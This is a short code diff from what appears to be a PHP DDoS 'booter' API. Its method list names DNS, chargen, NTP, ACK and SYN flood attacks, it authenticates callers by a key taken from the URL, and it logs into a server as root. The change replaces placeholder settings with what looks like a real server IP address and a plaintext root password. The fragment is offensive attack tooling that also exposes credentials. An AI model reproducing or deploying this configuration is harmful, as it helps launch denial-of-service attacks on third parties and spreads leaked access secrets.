@@ -16,8 +16,8 @@
 <?php
 ignore_user_abort(true);
 set_time_limit(1000);
-$server_ip = "1.3.3.7"; // Put your server IP here 
-$server_pass = "mypassword";  // Put your server Password here
+$server_ip = "159.89.192.136"; // Put your server IP here 
+$server_pass = "masiurra12@Ma";  // Put your server Password here
 $server_user = "root";  // Server Username (Default: root)
 $array = array("dns","chargen","ntp","ack","syn","STOP","stop"); // Methods
 $key = $_GET['key'];
